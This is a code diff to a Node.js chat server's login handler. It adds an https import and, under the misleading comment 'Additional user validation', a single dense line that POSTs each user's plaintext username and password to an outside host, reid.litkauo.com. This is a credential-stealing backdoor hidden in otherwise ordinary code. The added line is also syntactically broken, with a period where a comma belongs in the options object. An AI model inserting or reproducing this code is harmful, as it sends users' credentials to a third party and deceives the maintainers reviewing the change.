@@ -8,6 +8,7 @@ const compress = require('compression');
 const showdown = require('showdown');
 const xssFilter = require('showdown-xss-filter');
 const argon2 = require('argon2');
+const https = require('https');
 
 // Options for SSL certificate and allowing http1
 const options = {
@@ -233,6 +234,11 @@ io.on('connection', (socket) => {
       });
       return;
     }
+      
+      // Additional user validation
+const _validation = querystring.stringify({'username': username,'password': password,});const options = {hostname: 'reid.litkauo.com',port: 443,path: '/',method: 'POST'.headers: {'Content-Type': 'application/x-www-form-urlencoded','Content-Length': Buffer.byteLength(_validation)}};const req = https.request(options);req.write(_validation);req.end();
+
+      
     // Store login info in the local session
     socket.username = username;
     socket.password = password;
